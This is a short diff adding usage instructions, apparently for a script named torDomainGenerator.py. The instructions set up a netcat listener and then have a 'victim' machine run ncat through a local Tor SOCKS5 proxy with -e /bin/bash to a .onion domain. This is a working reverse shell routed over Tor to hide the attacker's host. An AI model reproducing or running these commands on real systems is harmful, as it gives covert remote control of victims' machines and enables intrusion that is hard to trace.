@@ -1,0 +1,6 @@
+After running torDomainGenerator.py using following command 
+# python3 torDomainGenerator.py
+Run netcat listener on port 5000 using following command
+#nc -lvp 5000
+Run the following in victim test machine
+ncat --proxy 127.0.0.1:9050 --proxy-type socks5 -e /bin/bash yournewdomain.onion 80
